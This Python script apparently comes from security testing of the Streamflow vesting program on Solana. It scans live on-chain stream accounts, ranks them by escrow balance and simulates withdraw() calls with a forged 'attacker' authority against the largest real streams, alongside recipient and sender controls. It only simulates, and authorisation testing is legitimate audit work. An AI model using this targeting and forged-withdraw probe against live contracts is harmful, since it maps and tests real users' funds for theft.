#!/usr/bin/env python3
"""Find a live Streamflow stream with a positive escrow balance, then test whether
withdraw() is gated on the authority (sender/recipient). Read-only."""
import sys, os, base64, time, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import sim_battery as B, simlib as S
from sol import get_program_accounts, get_multiple, b58enc

def pk(raw,o): return b58enc(raw[o:o+32])
def u64(raw,o): return int.from_bytes(raw[o:o+8],'little')

def main():
    print("fetching vesting accounts (slice 700) ...", flush=True)
    accs = get_program_accounts(B.VESTING, encoding="base64", dataSlice={"offset": 0, "length": 700})
    print("accounts", len(accs), flush=True)
    cands = []
    for a in accs:
        raw = base64.b64decode(a["account"]["data"][0])
        if len(raw) < 700: continue
        cands.append({"pubkey": a["pubkey"], "escrow": pk(raw,209), "recipient": pk(raw,113),
                      "sender": pk(raw,49), "recipient_tokens": pk(raw,145), "sender_tokens": pk(raw,81),
                      "mint": pk(raw,177), "treasury": pk(raw,241), "treasury_tokens": pk(raw,273),
                      "partner": pk(raw,325), "partner_tokens": pk(raw,357),
                      "end_time": u64(raw,33), "withdrawn": u64(raw,17), "last_withdrawn": u64(raw,41),
                      "start_time": u64(raw,409), "deposited": u64(raw,417), "period": u64(raw,425),
                      "amount_per_period": u64(raw,433), "cliff": u64(raw,441), "cliff_amount": u64(raw,449)})
        if len(cands) >= 30000: break
    print("candidates", len(cands), flush=True)
    keys = [c["escrow"] for c in cands]
    bal = {}
    for i in range(0, len(keys), 100):
        vals = get_multiple(keys[i:i+100], encoding="base64")
        if not isinstance(vals, list): continue
        for k, v in zip(keys[i:i+100], vals):
            if v:
                raw = base64.b64decode(v["data"][0]); bal[k] = int.from_bytes(raw[64:72], "little")
        if i % 5000 == 0: print("  balances", i, flush=True)
    now = int(time.time())
    def available(c):
        if now < c["cliff"]: return 0
        if now > c["end_time"]: unlocked = c["deposited"]
        else:
            saved = c["cliff_amount"] if c["last_withdrawn"] == 0 else c["deposited"] - c["withdrawn"]
            st = c["cliff"] if c["last_withdrawn"] == 0 else c["last_withdrawn"]
            step = c["period"] or 1
            unlocked = c["cliff_amount"] + ((now - st) // step) * c["amount_per_period"]
            unlocked = min(unlocked, c["deposited"])
        return unlocked - c["withdrawn"]
    live = [c for c in cands if bal.get(c["escrow"], 0) > 0 and available(c) > 0]
    live.sort(key=lambda c: -bal[c["escrow"]])
    print("live (escrow>0, available>0):", len(live), flush=True)
    for c in live[:5]:
        print("  ", c["pubkey"], "esc", c["escrow"], "bal", bal[c["escrow"]], "end", c["end_time"], flush=True)
    json.dump({"live": live[:20], "balances": {c["escrow"]: bal.get(c["escrow"],0) for c in live[:20]}},
              open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "vesting_live.json"), "w"), indent=1)
    # test withdraw with forged authority on the biggest live stream
    for c in live[:3]:
        w_data = B.disc("withdraw") + (1).to_bytes(8, "little") + b"\x00" * 10
        wa = [(B.ATTACKER, True, True), (c["recipient"], False, True), (c["recipient_tokens"], False, True),
              (c["pubkey"], False, True), (c["escrow"], False, True), (c["treasury"], False, True),
              (c["treasury_tokens"], False, True), (c["partner"], False, True), (c["partner_tokens"], False, True),
              (c["mint"], False, True), (B.TOKEN, False, False)]
        r = S.summarize(S.sim([(B.VESTING, wa, w_data)]))
        print("FORGED authority withdraw", c["pubkey"], "->", r["err"], flush=True)
        for l in (r.get("log_tail") or []): print("     ", l, flush=True)
        wc = list(wa); wc[0] = (c["recipient"], True, True)
        r2 = S.summarize(S.sim([(B.VESTING, wc, w_data)]))
        print("CONTROL recipient withdraw", c["pubkey"], "->", r2["err"], flush=True)
        for l in (r2.get("log_tail") or []): print("     ", l, flush=True)
        wd = list(wa); wd[0] = (c["sender"], True, True)
        r3 = S.summarize(S.sim([(B.VESTING, wd, w_data)]))
        print("SENDER-as-authority withdraw", c["pubkey"], "->", r3["err"], flush=True)
        break

if __name__ == "__main__":
    main()
